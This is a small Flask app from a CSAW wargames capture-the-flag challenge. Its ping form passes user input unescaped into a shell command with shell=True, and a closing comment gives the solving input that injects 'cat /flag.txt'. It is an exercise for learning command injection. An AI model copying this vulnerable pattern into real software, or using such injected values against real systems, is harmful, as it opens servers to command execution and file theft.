#http://wargames.csaw.io:5001/
#!/usr/bin/python3

from flask import Flask, request
import subprocess
import html


app = Flask(__name__)

form = '''
<form>
<input name="ip">
<input type="submit" name="submit">
</form>

<form>
<input type="submit" name="src" value="show source" >
</form>
'''

@app.route('/')
def index():
    if 'ip' in request.args:
        ip = request.args.get('ip')
        return subprocess.check_output(
            'ping -c 1 "' + ip + '"',
            shell=True
        ).decode()
    if 'src' in request.args:
        return open('app.py').read()
    return form

if __name__ == "__main__":
    app.run('0.0.0.0', 5001)

#input ";cat /flag.txt#